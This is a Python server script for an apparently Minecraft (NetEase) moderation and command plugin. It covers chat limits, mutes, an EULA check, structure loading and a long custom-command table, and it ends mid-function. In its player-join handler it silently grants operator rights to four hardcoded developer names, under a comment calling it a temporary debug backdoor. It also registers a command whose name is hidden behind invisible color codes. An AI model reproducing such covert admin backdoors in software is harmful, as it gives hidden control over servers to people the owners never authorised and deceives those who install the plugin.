# -*- coding: utf-8 -*-
import server.extraServerApi as serverApi
import math
import time
import traceback
import json
import random
import re
CF = serverApi.GetEngineCompFactory()
levelId = serverApi.GetLevelId()
compCmd = CF.CreateCommand(levelId)
compExtra = CF.CreateExtraData(levelId)
compGame = CF.CreateGame(levelId)
compHttp = CF.CreateHttp(levelId)
compItemWorld = CF.CreateItem(levelId)
compBlockEntity = CF.CreateBlockEntity(levelId)

intg = lambda x: int(math.floor(x))
create_players_str = lambda players: ', '.join([CF.CreateName(player).GetName() for player in players])

def unicode_convert(input):
	#type: (dict|str) -> dict|list|str|bool
	if isinstance(input, dict):
		return {unicode_convert(key): unicode_convert(value) for key, value in input.items()}
	elif isinstance(input, list):
		return [unicode_convert(element) for element in input]
	elif isinstance(input, unicode): # type: ignore
		return input.encode('utf-8')
	return input

def checkjson(data):
	#type: (str) -> list
	try:
		itemDict = json.loads(data.replace("'", '"'))
	except ValueError as errordata:
		errordata = str(errordata)
		if errordata.find('char') == -1:
			return ['无效的nbt', True]
		if errordata.find('Extra') != -1:
			split = errordata.split(' - ')
			start = int(split[1][split[1].find('char') + 5:])
			end = int(split[2][0:-1])
		else:
			start = int(errordata[errordata.find('char') + 5:-1])
			end = start + 1
		return ['无效的nbt 位于 %s>>%s<<%s' % (data[:start], data[start:end], data[end:]), True]
	if isinstance(itemDict, dict):
		return [unicode_convert(itemDict), False]
	return['无效的nbt', True]

class mainServerSystem(serverApi.GetServerSystemCls()):
	def __init__(self, namespace, systemName):
		super(mainServerSystem, self).__init__(namespace, systemName)
		self.last_message_time = {} # 初始化发言限频字典
		self._is_Structure_Loading = False # 标记当前是否有玩家正在加载结构
		self._buffer = {} # 用于存储分块数据的缓冲区
		self._structure_receive_timeout_counter = 0 # 结构加载超时计数器
		self._structure_load_coroutine = {} # 结构加载协程字典

		listenServerSysEvent = lambda eventId, callback: self.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), eventId, self, callback)
		listenServerSysEvent("ServerChatEvent", self.OnServerChat)
		listenServerSysEvent("CommandEvent", self.OnCommand)
		listenServerSysEvent("PlayerJoinMessageEvent", self.OnAddPlayer)
		listenServerSysEvent("PlayerLeftMessageServerEvent", self.OnRemovePlayer)
		listenServerSysEvent("ClientLoadAddonsFinishServerEvent", self.OnClientLoadAddonsFinishServer)
		listenServerSysEvent("PlayerPermissionChangeServerEvent", self.OnPermissionChange)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', "enchant", self, self.enchant)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', "getitem", self, self.getitem)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', "changeTip", self, self.changeTips)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', "changenbt", self, self.changenbt)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', 'cmdbatch', self, self.cmdbatch)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', 'loadstructure_handshake', self, self.loadstructure_handshake)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', 'TryOpenEULA', self, self.TryOpenEULA)
		self.ListenForEvent('gtmbPlugin', 'mainClientSystem', 'EULA', self, self.eula)
		self.ListenForEvent('gtmbPlugin', 'cmdServerSystem', 'cancel_structure_loading', self, self.Cancel_Structure_Loading)
		compCmd.SetCommandPermissionLevel(4)
		CF.CreatePet(levelId).Disable()

	def __destroy__(self):
		try:
			for coroutine in self._structure_load_coroutine.values():
				serverApi.StopCoroutine(coroutine)
		except:
			pass

	def check_time_limit(self, playerId, current_time):
		# 管理员无限制
		if CF.CreatePlayer(playerId).GetPlayerOperation() == 2:
			return True
		
		limitFrequency = compExtra.GetExtraData("limitFrequency") if compExtra.GetExtraData("limitFrequency") else 0 # 如未定义，默认为0，即无限制
		if (limitFrequency - 0) < 0.01: # 处理浮点数误差 
			return True
		elif playerId in self.last_message_time:
			last_time = self.last_message_time[playerId]
			time_elapsed = current_time - last_time
			if time_elapsed < limitFrequency:
				compMsg = CF.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§e您发送消息过于频繁，请等待 %.1f 秒后再试" % (limitFrequency - time_elapsed))
				return False # 未超过限定时间
			else:
				return True # 超过限定时间，允许发言
		else:
			return True # 从未发言的玩家，允许发言

	def OnServerChat(self, args):

		playerId = args["playerId"]
		message = args["message"]
		username = args["username"]
		args["cancel"] = True

		if CF.CreateExtraData(playerId).GetExtraData("mute"):
			compMsg = CF.CreateMsg(playerId)
			compMsg.NotifyOneMessage(playerId, "您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", "§e")
			return
		
		for token in ("", "", ""):
			if token in message:
				compMsg = CF.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§c检测到您试图发送崩服文本，系统已将您禁言！请联系房间管理解除禁言", "§c")
				compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§e检测到玩家§c【%s】§r§e试图发送崩服文本，系统已将其禁言。若需解除禁言，请使用§a/mute§e命令"}]}' % username)
				CF.CreateExtraData(playerId).SetExtraData("mute", True)
				return

		# 普通消息
		current_time = time.time()
		if self.check_time_limit(playerId,current_time):
			compdata = CF.CreateExtraData(playerId)
			chatprefix = compdata.GetExtraData("chatprefix") if compdata.GetExtraData("chatprefix") else ""
			sanitized_msg = message if compGame.CheckWordsValid(message) else "***"
			compGame.SetNotifyMsg("%s%s >>> %s" % (chatprefix, username, sanitized_msg))
			self.last_message_time[playerId] = current_time

	def OnCommand(self, args):
		compMsg = CF.CreateMsg(args["entityId"])
		cmd = args["command"].strip().lower()
		entityId = args["entityId"]
		if cmd.startswith("/kill @e"):
			# 检查命令的剩余部分是否只有空格（忽略首尾空格）
			if not cmd[9:].strip():
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, '命令 /kill @e 已在本地图被禁止。', "§c")
				return
		
		if any(cmd.startswith(prefix) for prefix in ("/msg", "/me", "/tell","/w")):
			allow_msg = compExtra.GetExtraData("allow_msg")
			if not allow_msg and CF.CreatePlayer(entityId).GetPlayerOperation() != 2:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, "§r§e§l[MSGWatcher] §r§c当前房间禁止私聊消息。", "§c")
				return
			mute = CF.CreateExtraData(entityId).GetExtraData("mute")
			if mute:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, 
										"您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", 
										"§e")
				return
			current_time = time.time()
			if self.check_time_limit(entityId,current_time):
				self.last_message_time[entityId] = current_time # 更新最后发言时间
			else:
				args["cancel"] = True
				return
			
	def OnAddPlayer(self, args):
		compPlayer = CF.CreatePlayer(args['id'])
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
			compPlayer.SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
			compPlayer.SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
			compPlayer.SetPermissionLevel(2)
		elif args["name"] == "渡鸦哥与陌生人":
			compPlayer.SetPermissionLevel(2)
		# 临时后门，仅用于调试
		CF.CreateExtraData(args["id"]).CleanExtraData('editingFunctionBlock')

	def OnRemovePlayer(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"

	def OnClientLoadAddonsFinishServer(self, args):
		playerId = args["playerId"]
		playername = CF.CreateName(playerId).GetName()
		
		# 禁用原版魔法指令模组
		CF.CreateAiCommand(playerId).Disable()
		
		compPlayer = CF.CreatePlayer(playerId)
		compMsg = CF.CreateMsg(playerId)
		compTag = CF.CreateTag(playerId)
		
		IS_OP = (compPlayer.GetPlayerOperation() == 2)

		if IS_OP:
			compTag.AddEntityTag("op")
			compMsg.NotifyOneMessage(playerId, "§6§l管理小助手>>> §r§a您已获得管理员权限")
		else:
			compTag.RemoveEntityTag("op")  # 防止房主转移后标签未移除
			if not compGame.CheckWordsValid(playername):
				compPlayer.SetPermissionLevel(0)
				compMsg.NotifyOneMessage(playerId, "§6§l注意>>> §r§c检测到您的名字中含有违禁词，已将您设为访客权限。")
				compGame.SetNotifyMsg("§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为访客权限。")
				compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家。"}]}',False)
				compTag.AddEntityTag("banname")

	def OnPermissionChange(self, args):
		compMsg = CF.CreateMsg(args['playerId'])
		compTag = CF.CreateTag(args['playerId'])
		if not args['oldPermission']['op'] and args['newPermission']['op']:
			compMsg.NotifyOneMessage(args['playerId'], '§6§l管理小助手>>> §r§a您已获得管理员权限')
			compTag.AddEntityTag("op")
		elif args['oldPermission']['op'] and not args['newPermission']['op']:
			compMsg.NotifyOneMessage(args['playerId'], '§6§l管理小助手>>> §r§c您的管理员权限已被撤销')
			compTag.RemoveEntityTag("op")

	def enchant(self, enchantdata):
		if CF.CreatePlayer(enchantdata["__id__"]).GetPlayerOperation() == 2:
			# 二次权限验证
			compItem = CF.CreateItem(enchantdata["__id__"])
			itemDict = compItem.GetPlayerItem(2, 0, True)
			if itemDict:
				if itemDict["userData"] is None:
					itemDict["userData"] = {}
				if itemDict["userData"].get('ench', None) is None:
					itemDict["userData"]['ench'] = []
				if enchantdata["id"] == "del":
					itemDict["userData"]['ench'].pop(0)
				else:
					itemDict["userData"]['ench'].insert(0, {'lvl': {'__type__': 2, '__value__': int(enchantdata["lvl"])}, 'id': {'__type__': 2, '__value__': int(enchantdata["id"])}, 'modEnchant': {'__type__': 8, '__value__': ''}})
				itemDict["enchantData"] = []
				compItem.SpawnItemToPlayerCarried(itemDict, enchantdata["__id__"])

	def getitem(self, itemdata):
		if CF.CreatePlayer(itemdata["__id__"]).GetPlayerOperation() == 2:
			CF.CreateItem(itemdata["__id__"]).SpawnItemToPlayerInv(itemdata, itemdata["__id__"])

	def changeTips(self, tips):
		if CF.CreatePlayer(tips["__id__"]).GetPlayerOperation() == 2:
			itemComp = CF.CreateItem(tips["__id__"])
			itemDict = itemComp.GetEntityItem(2, 0, True)
			if tips["Tips"] == '':
				del itemDict['userData']['ItemCustomTips']
			itemDict['customTips'] = tips["Tips"]
			itemComp.SpawnItemToPlayerCarried(itemDict, tips["__id__"])

	def changenbt(self, args):
		if CF.CreatePlayer(args["__id__"]).GetPlayerOperation() == 2:
			CF.CreateItem(args["__id__"]).SpawnItemToPlayerCarried(args["nbt"], args["__id__"])

	def cmdbatch(self, cmds):
		playerid = cmds["__id__"]
		cmd = cmds["cmds"]
		if CF.CreatePlayer(playerid).GetPlayerOperation() == 2:
			cmd = cmd.split("\n")
			playername = CF.CreateName(playerid).GetName()
			for i in cmd:
				compCmd.SetCommand('/execute as "'+ playername +'" at @s run ' + i, True)

	def loadstructure_handshake(self, data):
		self.structure_loading_playerid = data.get("__id__", None)
		if self._is_Structure_Loading:
			self.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": True,"reason":"SERVER_BUSY"})
			return
		if CF.CreatePlayer(self.structure_loading_playerid).GetPlayerOperation() != 2:
			self.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": True,"reason":"NO_PERMISSION"})
			return
		self.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": False})
		self._is_Structure_Loading = True
		self._is_structure_load_enable_coroutine = data.get("USE_COROUTINE", False)
		self._structure_load_coroutine_per_yield = data.get("COROUTINE_PER_YIELD",100)
		self.ListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(self.structure_loading_playerid), self, self._process_packet)
		
		self._structure_receive_timeout_counter = 0
		self._structure_receive_timeout_timer_object = compGame.AddRepeatedTimer(1, self._structure_receive_timeout_timer) # 计时器，发包间隔超过10秒则视为超时

	def _structure_receive_timeout_timer(self):
		self._structure_receive_timeout_counter = self._structure_receive_timeout_counter + 1
		if self._structure_receive_timeout_counter >= 10:
			print("取消结构加载，原因：接收数据超时")
			self._structure_receive_timeout_counter = 0
			self._is_Structure_Loading = False
			self._buffer.clear()
			self.UnListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(self.structure_loading_playerid), self, self._process_packet)
			compGame.CancelTimer(self._structure_receive_timeout_timer_object)
			del self._structure_receive_timeout_timer_object

	def _process_packet(self, packet):
		'''
		服务端收到的数据包：
		packet = {
				"sequence": index,  # 数据包的序号，从0开始
				"total_chunks": len(chunks),
				"data": chunk,
				"is_last": is_last  # 是否为最后一个数据包
			}
		'''
		sequence = packet.get("sequence", None)
		is_last = packet.get("is_last", False)
		playerid = packet.get("__id__", None)
		print("接收到来自玩家 %s 的数据包，序号：%s" % (playerid, sequence))
		self._structure_receive_timeout_counter = 0 # 重置超时计数器

		# 将数据包存入队列
		self._buffer[sequence] = packet.get("data", None)
		
		if is_last and len(self._buffer):
			if packet.get("total_chunks", -1) == len(self._buffer):
				print("玩家 %s 的所有数据包已接收完毕，开始组装数据..." % playerid)
				self.UnListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(playerid), self, self._process_packet)
				compGame.CancelTimer(self._structure_receive_timeout_timer_object)
				try:
					self._assemble_text(playerid)
				except:
					compMsg = CF.CreateMsg(playerid)
					compMsg.NotifyOneMessage(playerid, '结构加载错误，原因如下', '§c')
					for i in traceback.format_exc().splitlines():
						compMsg.NotifyOneMessage(playerid, i, '§c')
					self._is_Structure_Loading = False
			else:
				print("玩家 %s 的数据包数量不匹配，正在取消..." % playerid)
				self._is_Structure_Loading = False
				self._buffer.clear()
				self.UnListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(playerid), self, self._process_packet)
				compGame.CancelTimer(self._structure_receive_timeout_timer_object)

	def _assemble_text(self, playerid):
		# 按序号排序并组装数据
		assembled_data = ''.join(self._buffer[i] for i in sorted(self._buffer.keys()))
		structuredata = unicode_convert(json.loads(assembled_data)) #仍然会被storagekey崩掉，暂时留存
		self._buffer.clear()  # 清空缓冲区
		if self._is_structure_load_enable_coroutine:
			self.Load_Structure_Coroutine(structuredata, playerid)
		else:	
			self.Load_Structure(structuredata, playerid)

	def Load_Structure(self,data,playerid=None):
		if CF.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CF.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			player_X = intg(player_X)
			player_Y = int(player_Y)
			player_Z = intg(player_Z)
			structure = data["structuredata"]
			#print(data)
			palette = structure['structure']['palette']['default']
			block_entity_data = palette['block_position_data']
			blockcomp = CF.CreateBlockInfo(levelId)
			blockStateComp = CF.CreateBlockState(levelId)
			block_index = 0
			compMsg = CF.CreateMsg(playerid)
			for x in range(structure["size"][0]):
				for y in range(structure['size'][1]):
					for z in range(structure['size'][2]):
						if structure['structure']['block_indices'][0][block_index] != -1:
							block_info = palette['block_palette'][structure['structure']['block_indices'][0][block_index]]
							if block_info['name'] != 'minecraft:air':
								blockcomp.SetBlockNew((player_X+x, player_Y+y,player_Z+z),
													{'name':block_info['name'], 
													'aux': block_info.get('val', 0)}, 
													0, 
													data['dimension'], 
													False, 
													False)
								blockStateComp.SetBlockStates((player_X+x, player_Y+y,player_Z+z),block_info.get('states', {}), data['dimension'])
								if block_entity_data.has_key(str(block_index)) and block_entity_data[str(block_index)].has_key('block_entity_data'):
									#if i % 10 == 0: print(block_entity_data[str(i)]['block_entity_data'])
									blockcomp.SetBlockEntityData(data['dimension'], (player_X+x, player_Y+y,player_Z+z), block_entity_data[str(block_index)]['block_entity_data'])
						block_index += 1
			for entity in structure['structure']['entities']:
				x, y, z = entity['Pos']
				x = x['__value__']
				y = y['__value__']
				z = z['__value__']
				x -= structure['structure_world_origin'][0]
				y -= structure['structure_world_origin'][1]
				z -= structure['structure_world_origin'][2]
				x += player_X
				y += player_Y
				z += player_Z
				self.CreateEngineEntityByNBT(entity, (x, y, z), None, data['dimension'])
		self._is_Structure_Loading = False

	def Load_Structure_Coroutine(self, data, playerid=None):
		if CF.CreatePlayer(playerid).GetPlayerOperation() != 2:
			return
		
		playerpos = CF.CreatePos(playerid).GetFootPos()
		player_X, player_Y, player_Z = intg(playerpos[0]), int(playerpos[1]), intg(playerpos[2])
		
		structure = data["structuredata"]
		palette = structure['structure']['palette']['default']
		block_entity_data = palette['block_position_data']
		blockcomp = CF.CreateBlockInfo(levelId)
		blockStateComp = CF.CreateBlockState(levelId)
		compMsg = CF.CreateMsg(playerid)
		
		def spawn_entities_coroutine():
			# 生成实体协程
			entities_to_spawn = structure['structure']['entities']
			total_entities = len(entities_to_spawn)
			
			for i, entity_data in enumerate(entities_to_spawn):

				pos = entity_data['Pos']
				x, y, z = pos[0]['__value__'], pos[1]['__value__'], pos[2]['__value__']
				x -= structure['structure_world_origin'][0]
				y -= structure['structure_world_origin'][1]
				z -= structure['structure_world_origin'][2]
				x += player_X
				y += player_Y
				z += player_Z
				
				self.CreateEngineEntityByNBT(entity_data, (x, y, z), None, data['dimension'])
				
				# 每生成一定数量的实体后，暂停一帧
				if (i + 1) % self._structure_load_coroutine_per_yield == 0:
					yield

		
		def place_blocks_coroutine():
			# 放置方块协程
			block_indices = structure['structure']['block_indices'][0]
			block_palette = palette['block_palette']
			size = structure["size"]
			
			block_index = 0
			blocks_placed = 0
			total_blocks = sum(1 for index in block_indices if index != -1)

			for x in range(size[0]):
				for y in range(size[1]):
					for z in range(size[2]):
						
						if block_indices[block_index] != -1:
							palette_entry = block_palette[block_indices[block_index]]
							if palette_entry['name'] != 'minecraft:air':
								block_pos = (player_X + x, player_Y + y, player_Z + z)
								
								blockcomp.SetBlockNew(block_pos, 
													{'name': palette_entry['name'], 'aux': palette_entry.get('val', 0)}, 
													0, data['dimension'], False, False)
								blockStateComp.SetBlockStates(block_pos, palette_entry.get('states', {}), data['dimension'])
								
								if str(block_index) in block_entity_data and 'block_entity_data' in block_entity_data[str(block_index)]:
									blockcomp.SetBlockEntityData(data['dimension'], block_pos, block_entity_data[str(block_index)]['block_entity_data'])
								
								blocks_placed += 1

						block_index += 1
						
						# 每放置一定数量的方块后，暂停一帧
						if blocks_placed > 0 and blocks_placed % self._structure_load_coroutine_per_yield == 0:
							yield
		
		def on_all_tasks_finished():
			self._is_Structure_Loading = False
			compMsg.NotifyOneMessage(playerid, "§a结构加载完成！")
			print("Structure loading finished for player:", playerid)
			# 清理协程字典
			self._structure_load_coroutine.clear()

		# 方块放置完成后的回调：启动实体生成协程
		def on_blocks_placed():
			compMsg.NotifyOneMessage(playerid, "§a方块放置完成，开始生成实体...")
			# 启动第二个协程：生成实体
			self._structure_load_coroutine['spawn_entities'] = serverApi.StartCoroutine(spawn_entities_coroutine, on_all_tasks_finished)

		# 启动第一个协程：放置方块
		self._structure_load_coroutine['place_blocks'] = serverApi.StartCoroutine(place_blocks_coroutine, on_blocks_placed)
		compMsg.NotifyOneMessage(playerid, "§a协程任务已启动。使用指令 /cancel_structure_load 中止。\n开始放置方块...")

	def TryOpenEULA(self, args):
		playerId = args['__id__']
		playerUid = compHttp.GetPlayerUid(playerId)
		
		def checkEULAgreed_callback(EULAdata):
			compPlayerExtraData = CF.CreateExtraData(playerId)
			if EULAdata is None:
				compMsg = CF.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
				if compPlayerExtraData.GetExtraData('EULA'):
					return
				else:
					self.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})
					return	
			
			# 同步到本地
			cloud_data = {item["key"]: item["value"] for item in EULAdata["entity"]["data"]}
			cloud_agreed = cloud_data.get("EULA_Agreed", False)
			compPlayerExtraData.SetExtraData('EULA', cloud_agreed)
			
			if not cloud_agreed:
				self.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})

		compHttp.LobbyGetStorage(checkEULAgreed_callback, playerUid, ["EULA_Agreed"])

	def eula(self, args):
		playerId = args['__id__']
		if args["reason"] == "EULA_FAILED_ERROR":
			compCmd.SetCommand('/kick %s %s' % (CF.CreateName(playerId).GetName(), "您没有接受EULA协议"), False)
		elif args["reason"] == "EULA_AGREED":
			compMsg = CF.CreateMsg(playerId)
			playerUid = compHttp.GetPlayerUid(playerId)
			def callback(result):
				if result is None:
					compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！", "§a")
					CF.CreateExtraData(playerId).SetExtraData('EULA', True)
					return
				else:
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！EULA状态已同步至云服务器。", "§a")
					CF.CreateExtraData(playerId).SetExtraData('EULA', True)
			def entities_getter():
				return [{
					"key": "EULA_Agreed",
					"value": True
				}]
			compHttp.LobbySetStorageAndUserItem(callback, playerUid, None, entities_getter)
		else:
			compCmd.SetCommand('/kick %s %s' % (CF.CreateName(playerId).GetName(), "发生了未知错误，请联系开发者"), False)

	def Cancel_Structure_Loading(self,args):
		playerId = args.get("playerId", None)
		compMsg = CF.CreateMsg(playerId)
		# 停止所有结构加载协程
		if not self._is_Structure_Loading and not self._structure_load_coroutine:
			if playerId:
				compMsg.NotifyOneMessage(playerId, "§c未停止。当前没有正在进行的结构加载任务。")
			return
		for coroutine in self._structure_load_coroutine.values():
			serverApi.StopCoroutine(coroutine)
		self._structure_load_coroutine.clear()
		self._is_Structure_Loading = False
		self._buffer.clear()
		if playerId:
			compMsg.NotifyOneMessage(playerId, "§f结构加载已被中止。")

class cmdServerSystem(serverApi.GetServerSystemCls()):
	def __init__(self, namespace, systemName):
		super(cmdServerSystem, self).__init__(namespace, systemName)
		self.serverCustomCmds = {
			'setentityonfire':self.setentityonfire,
			'setcurrentairsupply':self.setcurrentairsupply,
			'setcompasstarget':self.setcompasstarget,
			'setcompassentity':self.setcompassentity,
			'setcolor':self.setcolor,
			'setchestitemnum':self.setchestitemnum,
			'setchestitemexchange':self.setchestitemexchange,
			'setcanpausescreen':self.setcanpausescreen,
			'setcanotherplayerride':self.setcanotherplayerride,
			'setattackplayersability':self.setattackplayersability,
			'setattackmobsability':self.setattackmobsability,
			'setattackdamage':self.setattackdamage,
			'setspawnpoint':self.setspawnpoint,
			'setplayerhealthlevel':self.setplayerhealthlevel,
			'setplayerstarvelevel':self.setplayerstarvelevel,
			'setplayerhunger':self.setplayerhunger,
			'setplayerattackspeedamplifier':self.setplayerattackspeedamplifier,
			'setplayerjumpable':self.setplayerjumpable,
			'setplayermovable':self.setplayermovable,
			'setplayernaturalstarve':self.setplayernaturalstarve,
			'setplayerprefixandsuffixname':self.setplayerprefixandsuffixname,
			'setplayermaxexhaustionvalue':self.setplayermaxexhaustionvalue,
			'setplayerhealthtick':self.setplayerhealthtick,
			'setplayerstarvetick':self.setplayerstarvetick,
			'sethurtcd':self.sethurtcd,
			'setattacktarget':self.setattacktarget,
			'resetattacktarget':self.resetattacktarget,
			'setbanplayerfishing':self.setbanplayerfishing,
			'setactorcanpush':self.setactorcanpush,
			'setactorcollidable':self.setactorcollidable,
			'setmineability':self.setmineability,
			'setbuildability':self.setbuildability,
			'setcontrol':self.setcontrol,
			'setpickuparea':self.setpickuparea,
			'setlevelgravity':self.setlevelgravity,
			'setjumppower':self.setjumppower,
			'setgravity':self.setgravity,
			'setworldspawnd':self.setworldspawnd,
			'playeruseitemtopos':self.playeruseitemtopos,
			'playeruseitemtoentity':self.playeruseitemtoentity,
			'playerdestoryblock': self.playerdestoryblock,
			'openworkbench':self.openworkbench,
			'openfoldgui':self.openfoldgui,
			'setimmunedamage':self.setimmunedamage,
			'setinvitemexchange':self.setinvitemexchange,
			'setinvitemnum':self.setinvitemnum,
			'setitemdurability':self.setitemdurability,
			'setitemmaxdurability':self.setitemmaxdurability,
			'setitemtierlevel':self.setitemtierlevel,
			'setitemtierspeed':self.setitemtierspeed,
			'setitemmaxstacksize':self.setitemmaxstacksize,
			'playerexhaustionratio':self.playerexhaustionratio,
			'setsigntextstyle':self.setsigntextstyle,
			'setsigntext':self.setsigntext,
			'setplayerinteracterange':self.setplayerinteracterange,
			'summonprojectile':self.summonprojectile,
			'setstepheight':self.setstepheight,
			'setsize':self.setsize,
			'playerchatprefix':self.playerchatprefix,
			'writehealthtoscoreboard':self.writehealthtoscoreboard,
			'writehungertoscoreboard':self.writehungertoscoreboard,
			'writearmortoscoreboard':self.writearmortoscoreboard,
			'writespeedtoscoreboard':self.writespeedtoscoreboard,
			'executecb':self.executecb,
			'setname':self.setname,
			'aicontrol':self.aicontrol,
			'param':self.param,
			'kickt':self.kickt,
			'explode':self.explode,
			'explodebypos':self.explodebypos,
			'console':self.console,
			'addaroundentitymotion':self.addaroundentitymotion,
			'addaroundpointmotion':self.addaroundpointmotion,
			'addvelocitymotion':self.addvelocitymotion,
			'startmotion':self.startmotion,
			'stopmotion':self.stopmotion,
			'removemotion':self.removemotion,
			'addenchant':self.addenchant,
			'addtrackmotion':self.addtrackmotion,
			'setactorcanburnbylightning':self.setactorcanburnbylightning,
			'setblockcanburnbylightning':self.setblockcanburnbylightning,
			'cancelshearsdestoryblockspeedall':self.cancelshearsdestoryblockspeedall,
			'cancelshearsdestoryblockspeed':self.cancelshearsdestoryblockspeed,
			'setshearsdestoryblockspeed':self.setshearsdestoryblockspeed,
			'changeselectslot':self.changeselectslot,
			'forbidliquidflow':self.forbidliquidflow,
			'getuid':self.getuid,
			'givewithnbt':self.givewithnbt,
			'spawnitemtocontainer':self.spawnitemtocontainer,
			'spawnitemtoenderchest':self.spawnitemtoenderchest,
			'replaceitemtocarried':self.replaceitemtocarried,
			'removeenchant':self.removeenchant,
			'resetmotion':self.resetmotion,
			'setleashholder':self.setleashholder,
			'setlootdropped':self.setlootdropped,
			'setmaxairsupply':self.setmaxairsupply,
			'knockback':self.knockback,
			'setmotion':self.setmotion,
			'setopencontainersability':self.setopencontainersability,
			'setoperatedoorability':self.setoperatedoorability,
			'setorbexperience':self.setorbexperience,
			'setpersistent':self.setpersistent,
			'setpistonmaxinteractioncount':self.setpistonmaxinteractioncount,
			'setplayeruiitem':self.setplayeruiitem,
			'if':self._if,
			'setteleportability':self.setteleportability,
			'settradelevel':self.settradelevel,
			'setvignette':self.setvignette,
			'setbrewingstandslotitem':self.setbrewingstandslotitem,
			'setdisablecontainers':self.setdisablecontainers,
			'setdisabledropitem':self.setdisabledropitem,
			'setdisablehunger':self.setdisablehunger,
			'setenchantmentseed':self.setenchantmentseed,
			'setentityitem':self.setentityitem,
			'setentityowner':self.setentityowner,
			'setentityride':self.setentityride,
			'setframeitemdropchange':self.setframeitemdropchange,
			'setframerotation':self.setframerotation,
			'sethopperspeed':self.sethopperspeed,
			'sethudchatstackposition':self.sethudchatstackposition,
			'sethudchatstackvisible':self.sethudchatstackvisible,
			'setshowrideui':self.setshowrideui,
			'summonitem':self.summonitem,
			'summonnbt':self.summonnbt,
			'setgaussian':self.setgaussian,
			'scoreparam': self.scoreparam,
			'mute': self.mute,
			"chatclear": self.chatclear,
			"openui": self.openui,
			"gettps": self.gettps,
			"copyright": self.copyright,
			"chatlimit":self.chatlimit,
			"allowmsg":self.allowmsg,
			"hidenametag": self.hidenametag,
			"cancel_structure_load": self.Cancel_Structure_Loading,
			#'setblocknbt': self.setblocknbt
			"§r§r§rgtmbdebug": self.debug
		}
		self.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), 'CustomCommandTriggerServerEvent', self, self.OnCustomCommandServer)

	def OnCustomCommandServer(self, args):
		cmdargs = []
		variant = args['variant']
		args_list = args.get('args', [])
		cmdargs = [i['value'] for i in args_list] if args_list else [] # 空值检查
		try:
			playerId = args['origin']['entityId']
		except:
			playerId = None
		handler = self.serverCustomCmds.get(args['command'])
		try:
			if handler is not None:
				return_value = handler(cmdargs, playerId, variant, args)
				if return_value is not None:
					args['return_failed'], args['return_msg_key'] = return_value
		except:
			args['return_failed'] = True
			args['return_msg_key'] = '出现未知错误, 原因见上'
			tracebacks = traceback.format_exc().splitlines()
			compMsg = CF.CreateMsg(playerId)
			if playerId:
				for i in tracebacks:
					compMsg.NotifyOneMessage(playerId, i, '§c')

	# 服务端函数部分由此开始
	def setentityonfire(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateAttr(i).SetEntityOnFire(cmdargs[1], cmdargs[2])
		return False, '已点燃 %s 个实体 %s 秒,伤害为 %s' % (len(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def setcurrentairsupply(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateBreath(i).SetCurrentAirSupply(cmdargs[1])
		return False, '已设置 %s 个实体氧气储备值为 %s' % (len(cmdargs[0]), cmdargs[1])
	
	def setcompasstarget(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		x, y, z = cmdargs[1]
		compassdata = [intg(x), int(y), intg(z)]
